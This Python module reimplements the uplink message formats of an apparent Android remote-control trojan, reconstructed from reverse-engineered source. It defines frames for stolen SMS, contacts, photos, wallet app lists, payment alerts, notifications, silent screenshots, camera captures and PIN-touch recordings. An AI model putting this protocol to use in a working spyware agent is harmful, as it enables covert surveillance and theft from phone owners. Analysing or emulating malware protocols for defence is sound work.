#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""被控端上行帧构造器 —— 字段严格来自源码证据（docs_emit_dictionary.md）。

证据链：`上行帧构造器`（分发器 的 m907(String type, JSONObject data)）的全部调用点。
每个帧的字段集合 = 调用点前 1.5 KB 内出现的 JSONObject.put("...") 键。

用法：
    import frames
    frames.build('smsList', dev='7f3a...', elem=[...], fromAdmin='admin')
    frames.fields_of('capture')      # 该帧的字段清单
"""
import time

# 帧名 -> 字段集（顺序即源码 put 顺序的近似，按字典稳定输出）
FRAME_FIELDS = {
    'adbPairStatus': ['type', 'connected', 'paired', 'message', 'deviceId'],
    'albumData': ['deviceId', 'pkg', 'elem', 'fromAdmin'],
    'albumLast': ['deviceId', 'fromAdmin'],
    'albumList': ['deviceId', 'fromAdmin', 'name', 'pkg', 'data'],
    'amountAlert': ['pkg', 'appName', 'amount', 'currency', 'amountType', 'rawText',
                    'contextText', 'deviceId'],
    'cacheData': ['deviceId', 'k', 'cache'],
    'camPic': ['deviceId', 'w', 'h', 'img'],
    'capture': ['deviceId', 'action', 'pkg', 'topPkg', 'topAct', 'deviceInfo',
                'w', 'h', 'iw', 'ih', 'orient', 'zip', 'ac', 'acc'],
    'contactList': ['deviceId', 'fromAdmin', 'granted', 'name', 'data'],
    'diag': ['deviceId', 'type', 'message', 'brand', 'model', 'sdk', 'connected',
             'paired', 'permissions', 'sms', 'album', 'ts'],
    'fcmToken': ['deviceId', 'fcmToken'],
    'fetchIcon': ['deviceId', 'pkg', 'fromAdmin', 'icon'],
    'formData': ['deviceId', 'data'],
    'iconList': ['deviceId', 'fromAdmin', 'name', 'pkg', 'data'],
    'notification': ['pkg', 'title', 'text', 'bigText', 'subText', 'timestamp'],
    'relayStatus': ['deviceId', 'screen', 'camera'],
    'reqPerList': ['deviceId', 'fromAdmin', 'granted', 'name', 'data'],
    'screenshot': ['deviceId', 'img'],
    'smsList': ['deviceId', 'fromAdmin', 'elem'],
    'smsReceived': ['sender', 'body', 'timestamp'],
    'touchPinData': ['deviceId', 'pkg', 'resolved', 'timestamp', 'touchCount', 'touches'],
    'walletList': ['deviceId', 'fromAdmin', 'name', 'pkg', 'data'],
    # 本实现约定（真机 WebRTC 信令用；原版帧字典里没有这类帧）
    'webrtcAnswer': ['deviceId', 'sdp', 'candidates'],
}

# "纯动作"指令的应答帧（原版执行后不回帧；我们回一条可观测 ack，并在文档标注）
ACK_FRAME = 'action_result'
ACK_FIELDS = ['deviceId', 'action', 'success', 'ts']

# 指令 -> 结果帧（源码硬证据：证据见 docs_action_emit_map.md）
ACTION_EMIT = {
    'readSmsList': 'smsList',
    'readContactList': 'contactList',
    'readAlbumList': 'albumList',
    'readAlbumLast': 'albumLast',
    'readAlbumThumbnail': 'albumData',
    'walletList': 'walletList',
    'readAppList': 'iconList',
    'iconList': 'iconList',
    'fetchIcon': 'fetchIcon',
    'reqPerList': 'reqPerList',
    'ask_relay': 'relayStatus',
    # 截图 / 相机 / 无障碍树 / 诊断（触发类来自各自发送点的调用方）
    'takeScreen': 'screenshot',
    'screenshot': 'screenshot',
    'silentShot': 'screenshot',
    'capturePic': 'screenshot',
    'adm': 'screenshot',
    'capture': 'capture',
    'getTree': 'capture',
    'startCam': 'camPic',
    'setCam': 'camPic',
    'diag': 'diag',
    'adbStatus': 'adbPairStatus',
    'adbPair': 'adbPairStatus',
    'touchPinReplay': 'touchPinData',
    'gestureCapture': 'touchPinData',
}


def fields_of(frame):
    return FRAME_FIELDS.get(frame) or ACK_FIELDS


# 溯源字段：不属于厂商帧字典，但必须能随帧走 —— 用来区分「这条数据是设备端从真机读到的」
# 还是「按协议语义构造的」。控制台据此显示「真机」标记（本实现约定，见 docs/agent_protocol.md）。
PROVENANCE_OK = ('real', 'source', 'count', 'total', 'nodeCount', 'apk', 'stale',
                 'imgLen', 'imgNote')


def build(frame, dev='', **kw):
    """按帧字典字段构造 data（缺字段给中性默认值，保证结构 100% 对齐）"""
    flds = fields_of(frame)
    now = int(time.time() * 1000)
    defaults = {
        'deviceId': dev, 'ts': now, 'timestamp': now,
        'success': True, 'action': kw.get('action', ''), 'type': kw.get('type', 'info'),
        'connected': True, 'paired': True, 'message': '', 'granted': [], 'name': '',
        'pkg': '', 'data': [], 'elem': {}, 'cache': '', 'k': '', 'img': '',
        'w': 0, 'h': 0, 'iw': 0, 'ih': 0, 'orient': 0, 'zip': '', 'ac': '',
        'acc': '', 'screen': False, 'camera': False, 'sms': 0, 'album': 0,
        'permissions': [], 'fromAdmin': kw.get('fromAdmin', 'admin'),
        'title': '', 'text': '', 'bigText': '', 'subText': '', 'sender': '',
        'body': '', 'touches': [], 'touchCount': 0, 'resolved': False,
        'amount': 0, 'currency': 'CNY', 'amountType': '', 'rawText': '',
        'contextText': '', 'appName': '', 'fcmToken': '', 'icon': '',
        'brand': 'Xiaomi', 'model': 'Android Device', 'sdk': 33,
        'topPkg': '', 'topAct': '', 'deviceInfo': {},
    }
    out = {}
    for f in flds:
        out[f] = kw[f] if f in kw else defaults.get(f, '')
    for k in PROVENANCE_OK:                    # 溯源字段按需带上（不写就不出现）
        if k in kw:
            out[k] = kw[k]
    return out
